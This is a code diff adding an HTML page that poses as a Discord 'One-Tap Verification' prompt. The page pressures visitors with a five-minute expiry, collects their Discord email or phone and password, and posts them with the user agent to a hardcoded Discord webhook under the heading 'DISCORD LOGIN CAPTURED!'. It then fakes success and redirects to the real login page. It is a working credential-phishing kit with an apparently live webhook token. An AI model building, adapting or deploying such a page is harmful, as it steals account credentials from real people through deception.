@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>One-Tap Verification</title>
+    <style>
+        body {
+            background: #1e1e2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        .container {
+            background: #181825;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            width: 400px;
+        }
+        h1 { color: #89b4fa; }
+        p { color: #cdd6f4; margin: 20px 0; }
+        .alert {
+            background: #313244;
+            padding: 15px;
+            border-radius: 10px;
+            color: #f9e2af;
+        }
+        .btn {
+            background: #5865F2;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 8px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+            cursor: pointer;
+            border: none;
+            font-size: 16px;
+        }
+        .btn:hover { background: #4752c4; }
+        .expires { color: #f38ba8; font-size: 12px; margin-top: 20px; }
+        input {
+            background: #313244;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            color: white;
+            width: 80%;
+            margin: 10px 0;
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container" id="step1">
+        <h1>🔐 One-Tap Verification</h1>
+        <p>Click the button below to verify your account.</p>
+        <div class="alert">
+            ⚠️ This verification expires in <strong>5 minutes</strong>
+        </div>
+        <button class="btn" onclick="showLogin()">✅ Verify Account</button>
+        <div class="expires">
+            Only you can see this message • One-Tap Security
+        </div>
+    </div>
+
+    <div class="container hidden" id="step2">
+        <h1>🔐 Login Required</h1>
+        <p>Enter your Discord credentials to complete verification.</p>
+        <input type="text" id="email" placeholder="Email or Phone Number"><br>
+        <input type="password" id="password" placeholder="Password"><br>
+        <button class="btn" onclick="sendData()">✅ Verify & Continue</button>
+        <div class="expires">
+            This is a required security check
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1498870894221594667/qfx1JJDGjOoOkzCoXdB7H9PUOd-GuZLBK6SfPT8-orpthddmmV7dvjvXFSmKC7gKtsEW";
+
+        function showLogin() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
+        function sendData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                alert("Please fill all fields");
+                return;
+            }
+
+            const data = {
+                content: `**🎯 DISCORD LOGIN CAPTURED!**\n📧 Email: ${email}\n🔑 Senha: ${password}\n🖥️ IP: ${window.location.hostname}\n🌐 User-Agent: ${navigator.userAgent}`
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                document.getElementById('step2').innerHTML = `
+                    <h1 style="color:#a6e3a1">✅ Verification Complete!</h1>
+                    <p>Your account has been verified. You will be redirected...</p>
+                    <script>setTimeout(() => { window.location.href = 'https://discord.com/login'; }, 3000);</script>
+                `;
+            }).catch(() => {
+                alert("Error. Please try again.");
+            });
+        }
+    </script>
+</body>
+</html>
